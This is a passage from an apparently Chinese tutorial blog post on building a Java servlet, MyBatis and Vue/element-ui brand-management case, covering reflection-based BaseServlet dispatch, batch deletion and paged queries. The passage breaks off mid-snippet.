<p><code>addBrand</code></p>
<pre><code class="hljs js"><span class="hljs-comment">// 添加数据</span>
            <span class="hljs-function"><span class="hljs-title">addBrand</span>(<span class="hljs-params"></span>)</span>&#123;
                <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
                <span class="hljs-built_in">this</span>.currentPage=<span class="hljs-number">1</span>
                axios(&#123;
                    method: <span class="hljs-string">&#x27;post&#x27;</span>,
                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/add&#x27;</span>,
                    data: brand = _this.brand
                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
                    <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
                    	<span class="hljs-comment">// 隐藏对话框</span>
                        _this.dialogVisible = <span class="hljs-literal">false</span>;
                        <span class="hljs-comment">// 重新加载全部数据</span>
                        _this.selectAll();
                        _this.msgbox(<span class="hljs-string">&quot;添加成功！&quot;</span>);
                    &#125;
                &#125;)
            &#125;</code></pre>



<h3 id="Servlet优化"><a href="#Servlet优化" class="headerlink" title="Servlet优化"></a>Servlet优化</h3><p>===Web 层的 Servlet 个数太多了，不利于管理和编写===</p>
<p>通过之前的两个功能，我们发现每一个功能都需要定义一个 <code>servlet</code>，一个模块需要实现增删改查功能，就需要4个 <code>servlet</code>，模块一多就会造成<code>servlet</code> 泛滥。此时我们就想 <code>servlet</code> 能不能像 <code>service</code> 一样，一个模块只定义一个 <code>servlet</code>，而每一个功能只需要在该 <code>servlet</code> 中定义对应的方法。例如下面代码：</p>
<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> </span>&#123;
    <span class="hljs-comment">//查询所有</span>
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
    
    <span class="hljs-comment">//添加数据</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
    
     <span class="hljs-comment">//修改数据</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
    
    <span class="hljs-comment">//删除删除</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
&#125;</code></pre>

<p>而我们知道发送请求 <code>servlet</code>，<code>tomcat</code> 会自动的调用 <code>service()</code> 方法，之前我们在自定义的 <code>servlet</code> 中重写 <code>doGet()</code> 方法和 <code>doPost()</code> 方法，当我们访问该 <code>servlet</code> 时会根据请求方式将请求分发给 <code>doGet()</code> 或者 <code>doPost()</code>  方法</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826184103210.png" alt="image-20210826184103210" style="zoom:80%;">

<p>那么我们也可以仿照这样请求分发的思想，在 <code>service()</code> 方法中根据具体的操作调用对应的方法，如：查询所有就调用 <code>selectAll()</code> 方法，添加企业信息就调用 <code>add()</code> 方法。</p>
<p>为了做到通用，我们定义一个通用的 <code>servlet</code> 类，在定义其他的 <code>servlet</code> 是不需要继承 <code>HttpServlet</code>，而继承我们定义的 <code>BaseServlet</code>，在<code>BaseServlet</code> 中调用具体 <code>servlet</code>（如<code>BrandServlet</code>）中的对应方法。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        <span class="hljs-comment">//进行请求的分发</span>
    &#125;
&#125;</code></pre>

<p><code>BrandServlet</code> 定义就需要修改为如下：</p>
<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseServlet</span> </span>&#123;
    <span class="hljs-comment">//用户实现分页查询</span>
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(...)</span> </span>&#123;&#125; 
    
    <span class="hljs-comment">//添加企业信息</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
    
    <span class="hljs-comment">//修改企业信息</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
    
    <span class="hljs-comment">//删除企业信息</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
&#125;</code></pre>

<p>那么如何在 <code>BaseServlet</code> 中调用对应的方法呢？比如查询所有就调用 <code>selectAll()</code> 方法。</p>
<p>可以==规定在发送请求时，请求资源的二级路径（/brandServlet/selectAll）和需要调用的方法名相同==，如：</p>
<p>查询所有数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/selectAll</code></p>
<p>添加数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/add</code></p>
<p>修改数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/update</code></p>
<p>删除数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/delete</code></p>
<p>这样的话，在 <code>BaseServlet</code> 中就需要获取到资源的二级路径作为方法名，然后调用该方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        <span class="hljs-comment">//1. 获取请求路径</span>
        String uri = req.getRequestURI(); <span class="hljs-comment">// 例如路径为：/brand-case/brand/selectAll</span>
        <span class="hljs-comment">//2. 获取最后一段路径，方法名</span>
        <span class="hljs-keyword">int</span> index = uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);
        String methodName = uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  获取到资源的二级路径  selectAll</span>

        <span class="hljs-comment">//2. 执行方法</span>
        <span class="hljs-comment">//2.1 获取BrandServlet /UserServlet 字节码对象 Class</span>
        <span class="hljs-comment">//System.out.println(this);</span>

        Class&lt;? extends BaseServlet&gt; cls = <span class="hljs-keyword">this</span>.getClass();
        <span class="hljs-comment">//2.2 获取方法 Method对象</span>
        <span class="hljs-keyword">try</span> &#123;
            Method method = cls.getMethod(methodName,？？？);
            <span class="hljs-comment">//4,调用该方法</span>
            method.invoke(<span class="hljs-keyword">this</span>,？？？);
        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;</code></pre>

<p>通过上面代码发现根据方法名获取对应方法的 <code>Method</code> 对象时需要指定方法参数的字节码对象。解决这个问题，可以将方法的参数类型规定死，而方法中可能需要用到 <code>request</code> 对象和 <code>response</code> 对象，所以指定方法的参数为 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code>，那么 <code>BrandServlet</code> 代码就可以改进为：</p>
<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseServlet</span> </span>&#123;
    <span class="hljs-comment">//用户实现分页查询</span>
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
    
    <span class="hljs-comment">//添加企业信息</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
    
    <span class="hljs-comment">//修改企业信息</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
    
    <span class="hljs-comment">//删除企业信息</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
&#125;</code></pre>

<p>BaseServlet代码可以改进为：</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;

    <span class="hljs-comment">//根据请求的最后一段路径来进行方法分发</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        <span class="hljs-comment">//1. 获取请求路径</span>
        String uri = req.getRequestURI(); <span class="hljs-comment">// 例如路径为：/brand-case/brand/selectAll</span>
        <span class="hljs-comment">//2. 获取最后一段路径，方法名</span>
        <span class="hljs-keyword">int</span> index = uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);
        String methodName = uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  获取到资源的二级路径  selectAll   </span>

        <span class="hljs-comment">//2. 执行方法</span>
        <span class="hljs-comment">//2.1 获取BrandServlet /UserServlet 字节码对象 Class</span>
        <span class="hljs-comment">//System.out.println(this);</span>

        Class&lt;? extends BaseServlet&gt; cls = <span class="hljs-keyword">this</span>.getClass();
        <span class="hljs-comment">//2.2 获取方法 Method对象</span>
        <span class="hljs-keyword">try</span> &#123;   
            Method method = cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class);
            <span class="hljs-comment">//2.3 执行方法</span>
            method.invoke(<span class="hljs-keyword">this</span>,req,resp);
        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;</code></pre>

<p>前端需要改只有几个访问路径，这里不做具体实现</p>
<h3 id="3-批量删除"><a href="#3-批量删除" class="headerlink" title="3.批量删除"></a>3.批量删除</h3><h4 id="需求分析-2"><a href="#需求分析-2" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>批量删除请求，携带参数为<code>[1,2,3...]</code>类型的json字符串</li>
<li>后端接收到json字符串后需要将其转为int数组</li>
<li>调用BrandService中的方法删除数据</li>
</ul>
<h4 id="后端实现-2"><a href="#后端实现-2" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-2"><a href="#dao-2" class="headerlink" title="dao"></a>dao</h5><p><code>BrandMapper</code>中添加<code>deleteByIds()</code>方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 批量删除</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;ids&quot;)</span> <span class="hljs-keyword">int</span>[] ids)</span></span>;</code></pre>

<h5 id="service-2"><a href="#service-2" class="headerlink" title="service"></a>service</h5><p>在<code>BrandService</code>中实现批量删除的业务逻辑代码</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 批量删除</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] ids)</span></span>&#123;
    SqlSession sqlSession = sqlSessionFactory.openSession();
    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
    mapper.deleteByIds(ids);
    sqlSession.commit();
    sqlSession.close();

&#125;</code></pre>

<h5 id="servlet-2"><a href="#servlet-2" class="headerlink" title="servlet"></a>servlet</h5><p><code>src/main/java/com/itheima/web/servlet</code>的<code>BrandServlet</code>添加<code>deleteByIds</code>方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 批量删除操作</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;

    BufferedReader reader = request.getReader();
    <span class="hljs-comment">// 获取json字符串</span>
    String line = reader.readLine();
    System.out.println(line);
    <span class="hljs-keyword">int</span>[] ids = JSON.parseObject(line, <span class="hljs-keyword">int</span>[].class);
    System.out.println(ids);

    service.deleteByIds(ids);
    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);

&#125;</code></pre>

<h4 id="前端实现-2"><a href="#前端实现-2" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取选中数据的id值"><a href="#获取选中数据的id值" class="headerlink" title="获取选中数据的id值"></a>获取选中数据的id值</h5><p><code>handleSelectionChange</code></p>
<pre><code class="hljs html">&lt;el-table
                :data=&quot;brandlist&quot;
                style=&quot;width: 100%&quot;
                :row-class-name=&quot;tableRowClassName&quot;
                @selection-change=&quot;handleSelectionChange&quot;
        &gt;</code></pre>

<p>可以看到当数据被选中后，<code>multipleSelection</code>会存放被选择的数据对象</p>
<pre><code class="hljs js"><span class="hljs-comment">// 复选框选中后执行的方法</span>
            <span class="hljs-function"><span class="hljs-title">handleSelectionChange</span>(<span class="hljs-params">val</span>)</span> &#123;
                <span class="hljs-built_in">this</span>.multipleSelection = val;

                <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.multipleSelection)
                <span class="hljs-comment">// console.log(this.multipleSelection)</span>
            &#125;,</code></pre>

<p>而我们所需要的只是对象的id值，因此需要遍历<code>multipleSelection</code>获取id值</p>
<pre><code class="hljs js"><span class="hljs-comment">// 从_this.multipleSelection获取brand的id值</span>
                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.multipleSelection.length;i++)&#123;
                        <span class="hljs-keyword">let</span> selectItem = _this.multipleSelection[i];
                        _this.selectedIds[i] = selectItem.id;
                    &#125;</code></pre>

<h5 id="批量删除提示"><a href="#批量删除提示" class="headerlink" title="批量删除提示"></a>批量删除提示</h5><p>删除操作一般比较危险因此需要让用户确认是否删除，在element-ui中找到<code>$confirm</code>组件实现该功能</p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">deleteByIds</span>(<span class="hljs-params"></span>)</span>&#123;
              <span class="hljs-built_in">this</span>.$confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>, <span class="hljs-string">&#x27;确认信息&#x27;</span>, &#123;
                  distinguishCancelAndClose: <span class="hljs-literal">true</span>,
                  confirmButtonText: <span class="hljs-string">&#x27;确定&#x27;</span>,
                  cancelButtonText: <span class="hljs-string">&#x27;取消&#x27;</span>
              &#125;).then(<span class="hljs-function">() =&gt;</span> &#123;
                  <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
                  <span class="hljs-comment">// 从_this.multipleSelection获取brand的id值</span>
                  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.multipleSelection.length;i++)&#123;
                      <span class="hljs-keyword">let</span> selectItem = _this.multipleSelection[i];
                      _this.selectedIds[i] = selectItem.id;
                  &#125;
                  axios(&#123;
                      method: <span class="hljs-string">&#x27;post&#x27;</span>,
                      url:<span class="hljs-string">&quot;http://localhost:8080/brand-case/brand/deleteByIds&quot;</span>,
                      data: _this.selectedIds
                  &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
                      <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
                          <span class="hljs-comment">// 重新查询数据</span>
                          _this.selectAll();
                          <span class="hljs-comment">//显示提示框</span>
                          _this.$message(&#123;
                              type: <span class="hljs-string">&#x27;success&#x27;</span>,
                              message: <span class="hljs-string">&#x27;删除成功&#x27;</span>
                          &#125;);
                      &#125;
                  &#125;)
                  &#125;).catch(<span class="hljs-function">() =&gt;</span> &#123;
                      <span class="hljs-built_in">this</span>.$message(&#123;
                          type: <span class="hljs-string">&#x27;info&#x27;</span>,
                          message: <span class="hljs-string">&quot;取消删除&quot;</span>
                      &#125;)
              &#125;);
          &#125;</code></pre>





<h3 id="4-分页查询"><a href="#4-分页查询" class="headerlink" title="4.分页查询"></a>4.分页查询</h3><h4 id="需求分析-3"><a href="#需求分析-3" class="headerlink" title="需求分析"></a>需求分析</h4><h5 id="分页查询sql"><a href="#分页查询sql" class="headerlink" title="分页查询sql"></a>分页查询sql</h5><p>分页查询也是从数据库进行查询的，所以我们要分页对应的SQL语句应该怎么写。分页查询使用 <code>LIMIT</code> 关键字，格式为：==<code>LIMIT 开始索引 每页显示的条数</code>==。以后前端页面在发送请求携带参数时，它并不明确开始索引是什么，但是它知道查询第几页。所以 <code>开始索引</code> 需要在后端进行计算，计算的公式是 ：==开始索引 = （当前页码 -  1）*  每页显示条数==</p>
<p>比如查询第一页的数据的 SQL 语句是：</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">5</span>;</code></pre>

<p>查询第二页的数据的 SQL 语句是：</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">5</span>;</code></pre>

<p>查询第三页的数据的 SQL 语句是：</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">10</span>,<span class="hljs-number">5</span>;</code></pre>

<h5 id="前后端数据分析"><a href="#前后端数据分析" class="headerlink" title="前后端数据分析"></a>前后端数据分析</h5><p>分页查询功能时候比较复杂的，所以我们要先分析清楚以下两个问题：</p>
<ul>
<li><p><strong>前端需要传递什么参数给后端</strong></p>
<p>根据上一步对分页查询 SQL 语句分析得出，前端需要给后端两个参数</p>
<ul>
<li>当前页码 ： currentPage</li>
<li>每页显示条数：pageSize</li>
</ul>
</li>
<li><p><strong>后端需要响应什么数据给前端</strong></p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826231842293.png" alt="image-20210826231842293" style="zoom:80%;">

<p>上图是分页查询页面展示的效果，从上面我们可以看出需要响应以下联股份数据</p>
<ul>
<li>当前页需要展示的数据。我们在后端一般会存储到 List 集合中</li>
<li>总共记录数。在上图页面中需要展示总的记录数，所以这部分数据也需要。总的页面 elementUI 的分页组件会自动计算，我们不需要关心</li>
</ul>
<p>而这两部分需要封装到 PageBean 对象中，并将该对象转换为 json 格式的数据响应回给浏览器</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826232158234.png" alt="image-20210826232158234" style="zoom:65%;">

</li>
</ul>
<p>通过上面的分析我们需要先在 <code>pojo</code> 包下创建 <code>PageBean</code> 类，为了做到通过会将其定义成泛型类，代码如下：</p>
<pre><code class="hljs java"><span class="hljs-comment">//分页查询的JavaBean</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PageBean</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;
    <span class="hljs-comment">// 总记录数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> totalCount;
    <span class="hljs-comment">// 当前页数据</span>
    <span class="hljs-keyword">private</span> List&lt;T&gt; rows;


    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getTotalCount</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> totalCount;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTotalCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> totalCount)</span> </span>&#123;
        <span class="hljs-keyword">this</span>.totalCount = totalCount;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;T&gt; <span class="hljs-title">getRows</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> rows;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setRows</span><span class="hljs-params">(List&lt;T&gt; rows)</span> </span>&#123;
        <span class="hljs-keyword">this</span>.rows = rows;
    &#125;
&#125;</code></pre>

<h4 id="后端实现-3"><a href="#后端实现-3" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-3"><a href="#dao-3" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 分页查询</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select * from tb_brand limit #&#123;begin&#125;, #&#123;size&#125;&quot;)</span>
<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
<span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectByPage</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-keyword">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-keyword">int</span> size)</span></span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 查询总记录数</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select count(*) from tb_brand&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">selectTotalCount</span><span class="hljs-params">()</span></span>;</code></pre>

<h5 id="service-3"><a href="#service-3" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 分页查询</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">   */</span>
  <span class="hljs-function"><span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title">selectByPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;
      SqlSession sqlSession = sqlSessionFactory.openSession();
      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);

      <span class="hljs-comment">// 根据公式计算起始值</span>
      <span class="hljs-keyword">int</span> begin = (currentPage - <span class="hljs-number">1</span>) * pageSize;
      <span class="hljs-keyword">int</span> size = pageSize;
      <span class="hljs-comment">// 获取该页数据</span>
      List&lt;Brand&gt; rows = mapper.selectByPage(begin, size);
<span class="hljs-comment">// 获取总记录数</span>
      <span class="hljs-keyword">int</span> totalCount = mapper.selectTotalCount();
<span class="hljs-comment">// 创建PageBean对象</span>
      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> PageBean&lt;&gt;();
      pageBean.setRows(rows);
      pageBean.setTotalCount(totalCount);

      sqlSession.close();

      <span class="hljs-keyword">return</span> pageBean;

  &#125;</code></pre>

<h5 id="servlet-3"><a href="#servlet-3" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 分页查询</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment">   */</span>
  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectByPage</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
      request.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);
      <span class="hljs-comment">// 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5</span>
      String _currentpage = request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);
      String _pagesize = request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);

      <span class="hljs-keyword">int</span> currentpage = Integer.parseInt(_currentpage);
      <span class="hljs-keyword">int</span> pagesize = Integer.parseInt(_pagesize);

      <span class="hljs-comment">// 2.转为json</span>
      PageBean&lt;Brand&gt; pageBean = service.selectByPage(currentpage, pagesize);

      String string = JSON.toJSONString(pageBean);
<span class="hljs-comment">// 响应数据</span>
      response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
      response.getWriter().write(string);

  &#125;</code></pre>

<h4 id="前端实现-3"><a href="#前端实现-3" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="分页工具条"><a href="#分页工具条" class="headerlink" title="分页工具条"></a>分页工具条</h5><p>放在表单下面</p>
<pre><code class="hljs html"><span class="hljs-comment">&lt;!--分页工具条--&gt;</span>
&lt;el-pagination
        @size-change=&quot;handleSizeChange&quot;   <span class="hljs-comment">&lt;!--设置每页显示条数--&gt;</span>
        @current-change=&quot;handleCurrentChange&quot;  <span class="hljs-comment">&lt;!--修改当前页码--&gt;</span>
        :current-page=&quot;currentPage&quot;         <span class="hljs-comment">&lt;!--绑定currentPage模型--&gt;</span>
        :page-sizes=&quot;[5, 10, 15, 20]&quot;
        :page-size=&quot;5&quot;
        layout=&quot;total, sizes, prev, pager, next, jumper&quot;
        :total=&quot;totalCount&quot;&gt;				<span class="hljs-comment">&lt;!--绑定totalCount模型--&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-pagination</span>&gt;</span></code></pre>

<p>修改<code>handleSizeChange</code>和<code>handleCurrentChange</code></p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">handleSizeChange</span>(<span class="hljs-params">val</span>)</span> &#123;
    <span class="hljs-comment">// console.log(`每页 $&#123;val&#125; 条`);</span>
    <span class="hljs-comment">// 设置每页显示条数</span>
    <span class="hljs-built_in">this</span>.pageSize = val;
    <span class="hljs-comment">// 重新查询</span>
    <span class="hljs-built_in">this</span>.selectAll();
    <span class="hljs-comment">// this.currentPage=1</span>
&#125;,
<span class="hljs-function"><span class="hljs-title">handleCurrentChange</span>(<span class="hljs-params">val</span>)</span> &#123;
    <span class="hljs-built_in">this</span>.currentPage = val;
&#125;,</code></pre>

<h5 id="修改selectAll-异步请求方法"><a href="#修改selectAll-异步请求方法" class="headerlink" title="修改selectAll()异步请求方法"></a>修改selectAll()异步请求方法</h5><p>主要修改url和获取响应数据后的处理方式</p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">selectAll</span>(<span class="hljs-params"></span>)</span>&#123;
                <span class="hljs-comment">// var _this = this;</span>
                <span class="hljs-comment">// axios(&#123;</span>
                <span class="hljs-comment">//     method: &#x27;GET&#x27;,</span>
